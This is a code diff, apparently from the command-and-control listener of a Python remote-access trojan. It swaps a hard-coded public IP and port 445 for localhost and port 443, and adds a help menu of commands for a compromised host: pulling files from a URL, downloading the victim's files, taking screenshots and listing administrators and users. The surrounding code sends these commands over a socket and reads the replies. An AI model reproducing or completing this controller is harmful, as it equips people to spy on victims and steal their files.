@@ -1,8 +1,8 @@
 import socket, os
 
 class listener(object):
-    TCP_IP = '85.255.5.44'
-    PORT = 445
+    TCP_IP = '127.0.0.1'
+    PORT = 443
     BUFFER_SIZE = 4096 * 2  # Normally 1024, but we want fast response
 
     def start(self):
@@ -25,6 +25,13 @@ class listener(object):
                     connection.sendall("quit\n")
                     connection.close()
                     os._exit(0)
+                elif resp == "help\n":
+                    print "start for start listener.\nstop for stop listener.\nstatus for status.\noptions for " \
+                          "set options.\nexit for exit program\n"
+                    print "admins for administrators.\nusers for users.\nwhelp for windows help.\n"
+                    print "getFile(url to file) for download file from web."
+                    print "download(path to file) for download file from host."
+                    print "screenshot for create screenshot."
                 elif resp == "screenshot\n":
                     connection.sendall(resp)
                     data = connection.recv(4096)
